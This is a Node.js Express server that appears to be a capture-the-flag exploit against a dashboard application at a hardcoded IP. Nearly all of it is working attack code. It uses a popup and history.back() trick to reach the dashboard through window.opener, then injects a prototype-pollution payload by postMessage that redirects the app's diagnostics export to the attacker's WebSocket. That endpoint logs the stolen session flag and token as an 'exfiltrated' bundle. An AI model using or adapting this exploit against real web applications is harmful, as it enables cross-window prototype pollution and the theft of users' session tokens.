const express = require('express');
const expressWs = require('express-ws');

const app = express();
expressWs(app);

const PORT = process.env.PORT || 10000;
const TARGET = 'http://34.118.127.209:35666/';

// ── GET / ── Landing: open helper popup, then IMMEDIATELY history.back() ──
app.get('/', (req, res) => {
  res.type('html').send(`<!DOCTYPE html>
<html><body>
<script>
function L(m){try{navigator.sendBeacon('/log?'+encodeURIComponent(m));}catch(e){}}

L('start|hist='+history.length);

// 1. Open helper popup (HTTPS→HTTPS = always works)
var h = window.open('/helper');
L('helper='+(h?'ok':'null'));

// 2. IMMEDIATELY go back to dashboard (history navigation bypasses mixed-content)
//    Bot flow: goto(dashboard) → goto(ourURL) → history has 2 entries
//    history.back() restores dashboard in THIS window
//    helper's window.opener still points to this window → now showing dashboard
if(history.length > 1){
  L('back_now');
  history.back();
} else {
  L('no_hist');
}
</script>
</body></html>`);
});

// ── GET /helper ── Attacks window.opener (= dashboard after history.back) ──
app.get('/helper', (req, res) => {
  const host = req.headers.host || req.hostname;
  const wsUrl = 'wss://' + host + '/ws';
  res.type('html').send(`<!DOCTYPE html>
<html><body>
<script>
function L(m){try{new Image().src='/log?'+encodeURIComponent(m)+'&_='+Date.now();}catch(e){}}
L('helper_loaded');

var PP = JSON.parse('{"__proto__":{"telemetryConsent":true,"channelMode":"ws","realtimeEndpoint":"${wsUrl}"}}');

function attack(){
  if(!window.opener){L('h_no_opener');return;}

  var co=false;
  try{window.opener.location.href;L('h_same');}catch(e){co=true;L('h_cross');}
  try{L('h_len='+window.opener.length);}catch(e){L('h_len_err');}

  // Send pollution + trigger regardless
  try{
    window.opener.postMessage({type:'prefs:update',payload:{theme:PP}},'*');
    L('h_pollute');
  }catch(e){L('h_pollute_err='+e.message);}

  setTimeout(function(){
    try{
      window.opener.postMessage({type:'diagnostics:export'},'*');
      L('h_trigger');
    }catch(e){L('h_trigger_err='+e.message);}
  },600);
}

// Start after 2s (give dashboard time to load via history.back), repeat many times
var n=0;
var iv=setInterval(function(){
  n++;
  attack();
  L('h_attempt_'+n);
  if(n>=20)clearInterval(iv);
},2000);
</script>
</body></html>`);
});

// ── GET /log ── beacon logger ──
app.get('/log', (req, res) => {
  var raw = req.originalUrl.replace(/^\/log\?/,'').replace(/&_=\d+$/,'');
  console.log('[beacon]', decodeURIComponent(raw));
  res.status(204).end();
});

// ── WS /ws ── receive exfiltrated diagnostics ──
app.ws('/ws', (ws, req) => {
  console.log('[ws] connection from', req.ip);
  ws.on('message', (data) => {
    console.log('\n' + '='.repeat(62));
    console.log('  EXFILTRATED DIAGNOSTICS BUNDLE');
    console.log('='.repeat(62));
    try {
      const d = JSON.parse(data);
      console.log(JSON.stringify(d, null, 2));
      const s = d.session || {};
      if (s.flag) console.log('\n  >>> FLAG  =', s.flag);
      if (s.token) console.log('  >>> TOKEN =', s.token);
    } catch(e) {
      console.log(String(data).slice(0, 2000));
    }
    console.log('='.repeat(62) + '\n');
  });
  ws.on('close', () => console.log('[ws] closed'));
});

app.listen(PORT, () => {
  console.log('Listening on port', PORT);
});
